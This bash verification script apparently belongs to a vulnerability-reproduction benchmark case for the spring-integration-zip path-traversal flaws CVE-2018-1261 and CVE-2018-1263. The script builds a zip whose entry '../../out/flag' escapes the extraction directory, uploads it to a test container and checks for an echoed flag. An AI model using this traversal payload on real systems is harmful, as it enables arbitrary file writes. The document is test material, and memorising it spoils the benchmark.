#!/usr/bin/env bash
# verify.sh (PCBV2-0173 pivotal-spring-integration-zip-cve-2018-1263) -- 定制 residual 分支
# 0=效果发生(flag 回显) 10=未发生 20=环境失败 30=参数错误
#
# 机制: 上传 zip -> 服务用 REAL spring-integration-zip UnZipTransformer.transform() 解包 ->
#       "../.." 条目是否逃逸 workDir 完全由该版本自身 doZipTransform 决定; 逃逸则 canary
#       (条目内容=PCB_FLAG) 落盘 /work/out/flag(workDir 外), 服务在响应 witness 字段回显。
#   seed    mode=file (CVE-2018-1261 ZipSlip):
#             V0(1.0.0.RELEASE) 无检查 -> 逃逸 rc=0
#             V1(1.0.1.RELEASE) CVE-2018-1261 修复仅守 FILE 分支 -> 拦截 rc=10
#   residual mode=bytes (CVE-2018-1263 BYTE_ARRAY 分支未检查; candidate 内嵌字面量):
#             V1(1.0.1.RELEASE) BYTE_ARRAY 分支未守 -> 框架把 errant 路径交回消费应用,
#             消费应用写出 workDir -> 逃逸 rc=0
#             V2(1.0.2.RELEASE) checkPath() 双分支 -> 拦截 rc=10
# 判定: seed_exec.py 的 X 字段(PCB_X 出现在响应体) == RUN_FLAG_REF(回退 RUN_FLAG) -> rc=0
# 注: seed 的 canary 是 zip 条目内容（base64+DEFLATE 包裹），文本级 PCBFLAG_ 替换到不了条目内容，
#     故 seed 分支额外做 zip 内容级 flag 注入（见下），否则 witness 回显静态 PCBFLAG_demo 导致 v0 seed 判 10。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
# 判定基准: RUN_FLAG_REF 恒为 run 真 flag(回退 RUN_FLAG); wrong/stale 检查时 RUN_FLAG=override
FLAG_REF="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 HOSTPORT 由 PCB_TARGET_PORT 覆盖）
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
export PCB_X="$FLAG_REF"   # seed_exec.py 模块级 X = PCB_X or PCB_FLAG; 期望 flag 用 RUN_FLAG_REF

# probe <cand.json> : 通过公开执行器 seed_exec.py 探测一次，返回 0/10/20
probe() {
  local cand="$1" out rc
  out="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$cand" "$VERSION" 2>&1)" || { echo "seed_exec 失败: $out" >&2; return 20; }
  echo "[probe $VERSION] $out" >&2
  "$PY" -c 'import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get("X") == sys.argv[2] else 10)' "$out" "$FLAG_REF"
  rc=$?
  echo "[probe $VERSION] flag_ref=$FLAG_REF -> rc=$rc" >&2
  return $rc
}

rc=0
if [[ "$MODE" == "--seed" ]]; then
  # ---- 现有 seed 逻辑（保留）: original_poc.py(mode=file) -> PCBFLAG_ 占位替换 -> 包装 dict -> seed_exec.py
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
  # flag placeholder replace (file-based)
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  # wrap non-JSON candidate into multi-field dict (file-based)
  "$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
  # zip 内容级 flag 注入：canary 是 zip 条目 "../../out/flag" 的*内容*，被 base64(DEFLATE) 包裹，
  # 文本级 PCBFLAG_ 正则替换到不了条目内容（witness 会回显静态 PCBFLAG_demo）。此处解包重写为
  # 本 run 的 RUN_FLAG，保持 seed 的 mode=file 逃逸结构不变。
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<'ADAPTEOF3'
import base64, io, json, re, sys, zipfile
flag, p = sys.argv[1], sys.argv[2]
d = json.load(open(p, encoding="utf-8"))
if isinstance(d, dict) and d.get("zip_b64"):
    zin = zipfile.ZipFile(io.BytesIO(base64.b64decode(d["zip_b64"])))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            data = re.sub(rb'PCBFLAG_[A-Za-z0-9_]+', flag.encode(), data)
            zout.writestr(item, data)
    d["zip_b64"] = base64.b64encode(buf.getvalue()).decode("ascii")
    open(p, "w").write(json.dumps(d))
ADAPTEOF3
  probe "$WORK_DIR/cand.json"; rc=$?
else
  # ---- residual (CVE-2018-1263): BYTE_ARRAY 通道 (mode=bytes) 内嵌字面量构造。
  # 同一逃逸条目 "../../out/flag"; 1.0.1 的 BYTE_ARRAY 分支未检查 -> 消费应用写出 workDir。
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<'RESIDEOF'
import base64, io, json, sys, zipfile
flag, p = sys.argv[1], sys.argv[2]
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("../../out/flag", flag)   # arcname 原样存储, 含 "../.." 穿越
open(p, "w").write(json.dumps({
    "id": "cve-2018-1263-bytearray_returned_path",
    "mode": "bytes",                                  # POST /unzip?mode=bytes -> ZipResultType.BYTE_ARRAY
    "zip_b64": base64.b64encode(buf.getvalue()).decode("ascii"),
}))
RESIDEOF
  probe "$WORK_DIR/cand.json"; rc=$?
fi
echo "verify[$MODE] version=$VERSION rc=$rc (flag_ref=$FLAG_REF)" >&2
exit "$rc"
